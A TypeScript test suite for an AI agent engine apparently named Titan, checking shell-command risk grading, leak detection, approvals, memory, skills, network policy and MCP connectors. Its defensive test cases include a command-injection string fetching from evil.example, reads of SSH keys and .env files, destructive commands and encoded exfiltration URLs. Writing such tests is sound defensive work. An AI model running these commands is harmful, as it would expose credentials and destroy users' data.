// Phase 3: Titan's tools, memory, skills, past tasks, scripts that call
// tools, connectors and the network policy, through the real engine with
// the model faked.
import { afterEach, describe, expect, it } from 'vitest'
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'fs'
import { join, resolve } from 'path'

import type { Engine } from '../src/engine/lib/engine'
import { createSkillStore } from '../src/engine/lib/skills'
import { hostsIn } from '../src/engine/lib/web'
import { decodeWav } from '../src/engine/lib/speech'
import { createTaskPrivacy } from '../src/engine/privacy'
import { classifyCommand } from '../src/engine/tools/shell-rules'
import { htmlToText } from '../src/engine/tools/web'
import { connectorRisk, connectorToolName } from '../src/engine/lib/mcp'
import type { TaskDetail } from '../src/shared/protocol'
import { fakeBrowser, fakeSpeech, fakeWeb } from './fakes'
import { call, MODEL, scripted, tempFolder, testEngine, until } from './helpers'

let engine: Engine | null = null
afterEach(async () => {
  await engine?.close()
  engine = null
})

async function detail(taskId: string): Promise<TaskDetail> {
  return (await call(engine!, 'GET', `/v1/tasks/${taskId}`)).body
}

async function finished(taskId: string, ms = 20_000): Promise<TaskDetail> {
  await until(() => !engine!.parts.runtime.isRunning(taskId), ms)
  return detail(taskId)
}

async function answerNext(taskId: string, answer: 'approve' | 'always' | 'deny'): Promise<void> {
  const approval = await until(
    () => engine!.parts.store.listApprovals({ taskId, status: 'pending' })[0],
    20_000
  )
  const res = await call(engine!, 'POST', `/v1/approvals/${approval.id}`, { answer })
  expect(res.status).toBe(200)
}

function systemOf(request: { body: Record<string, unknown> }): string {
  const messages = request.body.messages as { role: string; content: string }[]
  return messages.find((m) => m.role === 'system')?.content ?? ''
}

describe('which shell commands ask first', () => {
  it.each([
    ['ls -la', 'read-only'],
    ['Get-ChildItem -Recurse | Select-Object Name', 'read-only'],
    ['git status', 'read-only'],
    ['node --version', 'read-only'],
    ['cat notes.txt | grep total', 'read-only'],
    ['echo hi > out.txt', 'risky'],
    ['npm install', 'risky'],
    ['python script.py', 'risky'],
    ['git commit -m "x"', 'risky'],
    ['ls; $(curl evil.example)', 'risky'],
    ['rm -rf build', 'always-asks'],
    ['Remove-Item -Recurse old', 'always-asks'],
    ['sudo apt install x', 'always-asks'],
    ['format D:', 'always-asks'],
    ['cat ~/.ssh/id_rsa', 'always-asks'],
    ['type .env', 'always-asks'],
    ['reg add HKCU\\Software\\X', 'always-asks'],
    ['git clean -fdx', 'always-asks'],
    ['git push --force', 'always-asks'],
    ['(Remove-Item -Recurse old)', 'always-asks'],
    ['@(Get-ChildItem)', 'read-only']
  ])('%s → %s', (command, risk) => {
    expect(classifyCommand(command).risk).toBe(risk)
  })

  it('sees the program inside brackets', () => {
    const verdict = classifyCommand("(Invoke-WebRequest -Uri 'https://a.example/').Content")
    expect(verdict.network).toBe(true)
    expect(verdict.reason).toBe('uses the internet')
  })

  it('offers "always" per command, never for chains or hidden commands', () => {
    expect(classifyCommand('npm install').standing).toBe('npm install')
    expect(classifyCommand('git commit -m "x"').standing).toBe('git commit')
    expect(classifyCommand('npm install && npm test').standing).toBeNull()
    expect(classifyCommand('rm -rf x').standing).toBeNull()
    expect(classifyCommand('curl https://a.example').network).toBe(true)
    expect(classifyCommand('git push').network).toBe(true)
  })
})

describe('private content going out', () => {
  const passage = 'The Q3 forecast for Ecotechcore is 412,000 EUR with a 7 percent margin.'

  it('catches a copied passage in every disguise', () => {
    const p = createTaskPrivacy()
    p.saw(`Notes\n${passage}\nEnd`, 'read_file')
    expect(p.isPrivate).toBe(true)
    expect(p.leak(`https://x.example/?q=${encodeURIComponent(passage)}`)).not.toBeNull()
    expect(p.leak(`https://x.example/${Buffer.from(passage).toString('base64url')}`)).not.toBeNull()
    expect(p.leak(`data=${Buffer.from(passage).toString('hex')}`)).not.toBeNull()
    expect(p.leak(passage.toUpperCase().replace(/ /g, '-'))).not.toBeNull()
    expect(p.leak(encodeURIComponent(encodeURIComponent(passage)))).not.toBeNull()
  })

  it("doesn't block ordinary words or short phrases", () => {
    const p = createTaskPrivacy()
    p.saw(passage, 'read_file')
    expect(p.leak('https://www.google.com/search?q=Ecotechcore+forecast')).toBeNull()
    expect(p.leak('https://example.com/margin')).toBeNull()
  })

  it('blocks anything shaped like a key', () => {
    const p = createTaskPrivacy()
    expect(
      p.leak(`https://x.example/?k=${['sk', 'ant', 'api03', 'a'.repeat(30)].join('-')}`)
    ).not.toBeNull()
  })

  it('quiet passages (memory) block without making the task private', () => {
    const p = createTaskPrivacy()
    p.saw(passage, 'memory', true)
    expect(p.isPrivate).toBe(false)
    expect(p.leak(passage)).not.toBeNull()
  })

  it('finds the sites a message is about', () => {
    expect(hostsIn('Check https://shop.example.com/a and ecotechcore.ro please').sort()).toEqual([
      'ecotechcore.ro',
      'shop.example.com'
    ])
  })
})

describe('the shell', () => {
  it('runs a command that only looks without asking, and asks for one that writes', async () => {
    const folder = tempFolder()
    writeFileSync(join(folder, 'a.txt'), 'x')
    const or = scripted([
      { toolCalls: [{ name: 'run_command', input: { command: 'echo hello-from-shell' } }] },
      { toolCalls: [{ name: 'run_command', input: { command: 'echo made > made.txt' } }] },
      { toolCalls: [{ name: 'run_command', input: { command: 'echo again > made.txt' } }] },
      { text: 'Done.' }
    ])
    engine = await testEngine({ fetch: or.fetch, folder })
    const { body } = await call(engine, 'POST', '/v1/tasks', { text: 'shell', model: MODEL })
    const taskId = body.task.id
    // The second command writes: it asks, and "always" covers that command in this folder.
    await answerNext(taskId, 'always')
    const done = await finished(taskId)
    expect(done.task.status).toBe('done')
    const outputs = done.messages
      .map((m) => m.message)
      .filter((m) => m.role === 'tool')
      .map((m) => (m.role === 'tool' ? m.output : ''))
    expect(outputs[0]).toContain('hello-from-shell')
    expect(existsSync(join(folder, 'made.txt'))).toBe(true)
    // Asked once only: the third ran under the standing "always".
    expect(done.approvals).toHaveLength(1)
    expect(done.approvals[0].alwaysLabel).toMatch(/Always allow `echo/)
    expect(done.activity.some((a) => a.approvedBy === 'you (always, in this folder)')).toBe(true)
  })

  it("doesn't pass the engine's keys to commands", async () => {
    const folder = tempFolder()
    process.env.OPENROUTER_API_KEY_TEST_LEAK = 'should-not-be-seen'
    const or = scripted([
      {
        toolCalls: [
          {
            name: 'run_command',
            input: {
              command:
                process.platform === 'win32'
                  ? 'Get-ChildItem env: | Format-Table -HideTableHeaders Name'
                  : 'env'
            }
          }
        ]
      },
      { text: 'Done.' }
    ])
    engine = await testEngine({ fetch: or.fetch, folder })
    const { body } = await call(engine, 'POST', '/v1/tasks', { text: 'env', model: MODEL })
    const done = await finished(body.task.id)
    const output = JSON.stringify(done.messages)
    expect(output).not.toContain('OPENROUTER_API_KEY_TEST_LEAK')
    delete process.env.OPENROUTER_API_KEY_TEST_LEAK
  })
})

describe('scripts that call Titan tools (feature 4.10)', () => {
  it('a script lists a folder through the permission layer; only its summary returns', async () => {
    const folder = tempFolder()
    for (let i = 0; i < 30; i++) writeFileSync(join(folder, `invoice-${i}.txt`), `total ${i * 10}`)
    const code = [
      "const listed = await titan.call('list_folder', { path: '.' })",
      'let sum = 0',
      'for (const line of listed.output.split("\\n")) {',
      '  const name = line.split("  ")[0]',
      "  if (!name.startsWith('invoice-')) continue",
      "  const file = await titan.call('read_file', { path: name })",
      '  sum += Number(/total (\\d+)/.exec(file.output)[1])',
      '}',
      "const refused = await titan.call('run_code', { language: 'javascript', code: '1' })",
      'console.log(`sum=${sum} refused=${refused.status}`)'
    ].join('\n')
    const or = scripted([
      { toolCalls: [{ name: 'run_code', input: { language: 'javascript', code } }] },
      { text: 'The total is 4350.' }
    ])
    engine = await testEngine({ fetch: or.fetch, folder })
    const { body } = await call(engine, 'POST', '/v1/tasks', { text: 'sum invoices', model: MODEL })
    const taskId = body.task.id
    await answerNext(taskId, 'approve')
    const done = await finished(taskId, 60_000)
    const scriptOutput = done.messages
      .map((m) => m.message)
      .find((m) => m.role === 'tool' && m.name === 'run_code')
    expect(scriptOutput && scriptOutput.role === 'tool' ? scriptOutput.output : '').toContain(
      'sum=4350 refused=refused'
    )
    // Every call the script made is in the activity log, marked as from a script.
    expect(done.activity.filter((a) => a.summary.endsWith('(from a script)')).length).toBe(31)
    // The token stops working when the task ends.
    const token = engine.parts.scriptToken(taskId)
    expect(token).toBeNull()
  })

  it("refuses a script token for anything but tool calls, and the window's token isn't needed", async () => {
    engine = await testEngine({ fetch: scripted([{ text: 'x' }]).fetch })
    const res = await fetch(`http://127.0.0.1:${engine.port}/v1/tool-calls`, {
      method: 'POST',
      headers: { Authorization: 'Bearer not-a-token', 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'list_folder', input: { path: '.' } })
    })
    expect(res.status).toBe(401)
    // The window's own token can't use the script route either.
    expect(
      (await call(engine, 'POST', '/v1/tool-calls', { name: 'list_folder', input: {} })).status
    ).toBe(403)
  })
})

describe('memory, skills and past tasks', () => {
  it('memory can be added, found, edited and deleted, and keys never stay in it', async () => {
    engine = await testEngine({ fetch: scripted([{ text: 'x' }]).fetch })
    const added = await call(engine, 'POST', '/v1/memory', {
      text: 'We are Ecotechcore, a small software company in Cluj',
      kind: 'profile'
    })
    expect(added.status).toBe(200)
    expect(added.body.memory).toMatchObject({ scope: 'shared', source: 'you' })
    const secret = await call(engine, 'POST', '/v1/memory', {
      text: `Our key is ${['sk', 'or', 'v1', 'abcdefabcdefabcdef1234'].join('-')}`,
      kind: 'fact'
    })
    expect(secret.body.memory.text).toContain('[redacted]')
    const found = await call(engine, 'GET', '/v1/memory?q=software company')
    expect(found.body.memories).toHaveLength(1)
    const edited = await call(engine, 'PUT', `/v1/memory/${added.body.memory.id}`, {
      text: 'We are in Brasov'
    })
    expect(edited.body.memory.text).toBe('We are in Brasov')
    expect((await call(engine, 'DELETE', `/v1/memory/${added.body.memory.id}`)).status).toBe(200)
    expect((await call(engine, 'GET', '/v1/memory?q=Brasov')).body.memories).toHaveLength(0)
    expect((await call(engine, 'POST', '/v1/memory', { text: 'x', kind: 'rule' })).status).toBe(400)
    expect(
      (await call(engine, 'POST', '/v1/memory', { text: 'x', kind: 'fact', scope: 'all' })).status
    ).toBe(400)
  })

  it('Titan sees its memories and skills, saves new ones, and keeps a record of the task', async () => {
    const or = scripted([
      {
        toolCalls: [
          {
            name: 'memory_save',
            input: { text: 'The user prefers answers in Romanian', kind: 'preference' }
          }
        ]
      },
      { text: 'Noted.' },
      { text: 'Second task.' }
    ])
    engine = await testEngine({ fetch: or.fetch })
    engine.parts.memory.add({
      scope: 'shared',
      kind: 'profile',
      text: 'The company sells honey',
      source: 'you'
    })
    engine.parts.memory.add({
      scope: 'agent:QA',
      kind: 'fact',
      text: 'QA secret note',
      source: 'you'
    })
    engine.parts.skills.save({
      name: 'monthly-report',
      description: 'Build the monthly sales report',
      body: '1. Read sales.csv',
      source: 'you'
    })

    const { body } = await call(engine, 'POST', '/v1/tasks', {
      text: 'Remember I like Romanian',
      model: MODEL
    })
    const done = await finished(body.task.id)
    // Saved without asking: the task had seen nothing from outside.
    expect(done.approvals).toHaveLength(0)
    expect(engine.parts.memory.list({ query: 'Romanian' })[0]).toMatchObject({
      kind: 'preference',
      scope: 'shared'
    })
    const system = systemOf(or.requests[0])
    expect(system).toContain('The company sells honey')
    expect(system).not.toContain('QA secret note')
    expect(system).toContain('monthly-report: Build the monthly sales report')

    // The task used a tool, so it left a record; the next similar task sees it.
    const records = (await call(engine, 'GET', '/v1/records?q=Romanian')).body.records
    expect(records).toHaveLength(1)
    expect(records[0].steps).toContain('Remembered')
    const second = await call(engine, 'POST', '/v1/tasks', {
      text: 'Do you remember Romanian?',
      model: MODEL
    })
    await finished(second.body.task.id)
    const system2 = systemOf(or.requests[2])
    expect(system2).toContain('The user prefers answers in Romanian')
    expect(system2).toContain('Similar tasks you did before')
    expect((await call(engine, 'DELETE', `/v1/records/${records[0].id}`)).status).toBe(200)
    expect((await call(engine, 'GET', '/v1/records')).body.records).toHaveLength(0)
  })

  it('skills are Markdown files the user can read, edit and delete', async () => {
    const dir = tempFolder()
    const skills = createSkillStore(join(dir, 'skills'))
    skills.save({
      name: 'Invoice Summary',
      description: 'Sum invoices',
      body: '1. Find the PDFs\n2. Add them up',
      source: 'Titan'
    })
    const file = readFileSync(join(dir, 'skills', 'invoice-summary.md'), 'utf8')
    expect(file).toMatch(/^---\nname: invoice-summary\ndescription: Sum invoices\nsource: Titan/)
    writeFileSync(
      join(dir, 'skills', 'invoice-summary.md'),
      file.replace('Add them up', 'Add them up in EUR')
    )
    expect(skills.get('invoice-summary')?.body).toContain('in EUR')
    skills.remove('invoice-summary')
    expect(skills.list()).toEqual([])
    expect(() =>
      skills.save({ name: '../escape', description: '', body: 'x', source: 'x' })
    ).not.toThrow()
    expect(skills.list().map((s) => s.name)).toEqual(['escape'])
  })
})

describe('the network policy in a task', () => {
  it('opens the sites a task is about quietly, and asks for a new one after private data', async () => {
    const folder = tempFolder()
    writeFileSync(
      join(folder, 'notes.txt'),
      'Private: our supplier is Miere Bună SRL, contract value 18,400 EUR per year.'
    )
    const web = fakeWeb({
      'https://docs.example.com/guide':
        '<html><title>Guide</title><body><p>How to export.</p></body></html>',
      'https://other.example/': '<html><body>Other</body></html>'
    })
    const or = scripted([
      { toolCalls: [{ name: 'web_fetch', input: { url: 'https://docs.example.com/guide' } }] },
      { toolCalls: [{ name: 'read_file', input: { path: 'notes.txt' } }] },
      { toolCalls: [{ name: 'web_fetch', input: { url: 'https://other.example/' } }] },
      { text: 'Done.' }
    ])
    engine = await testEngine({ fetch: or.fetch, toolFetch: web.fetch, folder })
    const { body } = await call(engine, 'POST', '/v1/tasks', {
      text: 'Read https://docs.example.com/guide and my notes',
      model: MODEL
    })
    const taskId = body.task.id
    const approval = await until(
      () => engine!.parts.store.listApprovals({ taskId, status: 'pending' })[0],
      10_000
    )
    expect(approval.summary).toBe('Open other.example? This task has read read_file.')
    expect(approval.canAlways).toBe(false)
    await call(engine, 'POST', `/v1/approvals/${approval.id}`, { answer: 'approve' })
    const done = await finished(taskId)
    expect(done.task.status).toBe('done')
    expect(web.requests.map((r) => r.url)).toEqual([
      'https://docs.example.com/guide',
      'https://other.example/'
    ])
    const page = done.messages
      .map((m) => m.message)
      .find((m) => m.role === 'tool' && m.name === 'web_fetch')
    expect(page && page.role === 'tool' ? page.output : '').toMatch(
      /UNTRUSTED-DATA[\s\S]*How to export/
    )
  })

  it('turns HTML into readable text', () => {
    const { title, text } = htmlToText(
      '<html><head><title>T</title><style>x{}</style></head><body><h1>Hi</h1><script>evil()</script><p>A &amp; B <a href="/x">link</a></p></body></html>'
    )
    expect(title).toBe('T')
    expect(text).toContain('A & B link (/x)')
    expect(text).not.toContain('evil')
  })
})

describe('the browser', () => {
  it('stops before a final step and goes on after the user approves', async () => {
    const browser = fakeBrowser()
    browser.labels.set('4', 'Place order')
    const or = scripted([
      { toolCalls: [{ name: 'browser_open', input: { url: 'https://shop.example/cart' } }] },
      { toolCalls: [{ name: 'browser_click', input: { ref: '4' } }] },
      { text: 'Ordered.' }
    ])
    engine = await testEngine({ fetch: or.fetch, browser: browser.host })
    const { body } = await call(engine, 'POST', '/v1/tasks', {
      text: 'Buy it at https://shop.example/cart',
      model: MODEL
    })
    const taskId = body.task.id
    const approval = await until(
      () => engine!.parts.store.listApprovals({ taskId, status: 'pending' })[0],
      10_000
    )
    expect(approval.summary).toContain('Place order')
    expect(browser.clicked).toEqual([])
    await call(engine, 'POST', `/v1/approvals/${approval.id}`, { answer: 'approve' })
    await finished(taskId)
    expect(browser.opened).toEqual(['https://shop.example/cart'])
    expect(browser.clicked).toEqual(['4'])
  })
})

describe('speech', () => {
  it('reads WAV files of any common format into 16 kHz mono', () => {
    const rate = 44100
    const frames = rate / 10
    const data = Buffer.alloc(frames * 4)
    for (let i = 0; i < frames; i++) {
      data.writeInt16LE(16000, i * 4)
      data.writeInt16LE(-16000, i * 4 + 2)
    }
    const header = Buffer.alloc(44)
    header.write('RIFF', 0)
    header.writeUInt32LE(36 + data.length, 4)
    header.write('WAVE', 8)
    header.write('fmt ', 12)
    header.writeUInt32LE(16, 16)
    header.writeUInt16LE(1, 20)
    header.writeUInt16LE(2, 22)
    header.writeUInt32LE(rate, 24)
    header.writeUInt32LE(rate * 4, 28)
    header.writeUInt16LE(4, 32)
    header.writeUInt16LE(16, 34)
    header.write('data', 36)
    header.writeUInt32LE(data.length, 40)
    const { samples, seconds } = decodeWav(Buffer.concat([header, data]))
    expect(seconds).toBeCloseTo(0.1)
    expect(samples.length).toBe(1600)
    expect(Math.abs(samples[10])).toBeLessThan(0.001) // left and right cancel out
    expect(() => decodeWav(Buffer.from('not a wav file at all'))).toThrow(/WAV/)
  })

  it('speak and transcribe work through the tools', async () => {
    const folder = tempFolder()
    const or = scripted([
      { toolCalls: [{ name: 'speak', input: { text: 'Hello', path: 'hello.wav' } }] },
      { toolCalls: [{ name: 'transcribe', input: { path: 'hello.wav' } }] },
      { text: 'Done.' }
    ])
    engine = await testEngine({
      fetch: or.fetch,
      folder,
      speech: {
        transcribe: async () => '',
        synthesize: async () => Buffer.alloc(0),
        access: fakeSpeech
      }
    })
    const { body } = await call(engine, 'POST', '/v1/tasks', { text: 'speak', model: MODEL })
    await answerNext(body.task.id, 'approve')
    const done = await finished(body.task.id)
    expect(existsSync(join(folder, 'hello.wav'))).toBe(true)
    expect(JSON.stringify(done.messages)).toContain('hello from the recording')
  })
})

describe('connectors (MCP)', () => {
  it('names and grades connector tools', () => {
    expect(connectorToolName('My CRM', 'list-customers')).toBe('my_crm_list_customers')
    expect(connectorRisk('list_customers', { readOnlyHint: true })).toBe('read')
    expect(connectorRisk('send_email', { readOnlyHint: true })).toBe('external')
    expect(connectorRisk('update_deal')).toBe('write')
    expect(connectorRisk('archive_thread', {})).toBe('external')
  })

  it('connects a program, gives it its own secret, and its tools go through approvals', async () => {
    const folder = tempFolder()
    const or = scripted([
      { toolCalls: [{ name: 'crm_list_customers', input: { city: 'Iasi' } }] },
      { toolCalls: [{ name: 'crm_send_email', input: { to: 'ana@example.com', body: 'Hi' } }] },
      { text: 'Done.' }
    ])
    engine = await testEngine({ fetch: or.fetch, folder })
    const added = await call(engine, 'POST', '/v1/connectors', {
      name: 'CRM',
      kind: 'stdio',
      command: process.execPath,
      args: [resolve('test/fixtures/mcp-server.mjs')]
    })
    expect(added.status).toBe(200)
    engine.setConnectorSecrets({ [added.body.connector.id]: { CRM_TOKEN: 'crm-secret-value-123' } })
    const ready = await until(async () => {
      const list = (await call(engine!, 'GET', '/v1/connectors')).body.connectors
      return list[0]?.status === 'ready' && list[0].secretNames.length ? list[0] : null
    }, 20_000)
    expect(ready.tools.map((t: { name: string; risk: string }) => `${t.name}:${t.risk}`)).toEqual([
      'crm_list_customers:read',
      'crm_send_email:external'
    ])

    const { body } = await call(engine, 'POST', '/v1/tasks', { text: 'Email Ana', model: MODEL })
    const taskId = body.task.id
    const approval = await until(
      () => engine!.parts.store.listApprovals({ taskId, status: 'pending' })[0],
      20_000
    )
    expect(approval).toMatchObject({ tool: 'crm_send_email', risk: 'external', canAlways: false })
    await call(engine, 'POST', `/v1/approvals/${approval.id}`, { answer: 'deny' })
    const done = await finished(taskId)
    const outputs = JSON.stringify(done.messages)
    expect(outputs).toContain('Ana Pop (Iasi), secret present')
    expect(outputs).not.toContain('sent to')
    expect(outputs).not.toContain('crm-secret-value-123')

    expect((await call(engine, 'DELETE', `/v1/connectors/${added.body.connector.id}`)).status).toBe(
      200
    )
    expect((await call(engine, 'GET', '/v1/connectors')).body.connectors).toEqual([])
  }, 60_000)

  it('refuses a connector address that is not https', async () => {
    engine = await testEngine({ fetch: scripted([{ text: 'x' }]).fetch })
    const res = await call(engine, 'POST', '/v1/connectors', {
      name: 'X',
      kind: 'http',
      url: 'http://evil.example/mcp'
    })
    expect(res.status).toBe(400)
  })
})

describe('skills stay in the data folder', () => {
  it("the file tools can't reach the skills folder", async () => {
    const data = tempFolder()
    mkdirSync(join(data, 'skills'))
    const or = scripted([
      {
        toolCalls: [
          { name: 'write_file', input: { path: join(data, 'skills', 'evil.md'), content: 'x' } }
        ]
      },
      { text: 'Done.' }
    ])
    engine = await testEngine({ fetch: or.fetch, folder: data, coreDirs: [data] })
    const { body } = await call(engine, 'POST', '/v1/tasks', {
      text: 'plant a skill',
      model: MODEL
    })
    await answerNext(body.task.id, 'approve')
    await finished(body.task.id)
    expect(existsSync(join(data, 'skills', 'evil.md'))).toBe(false)
  })
})
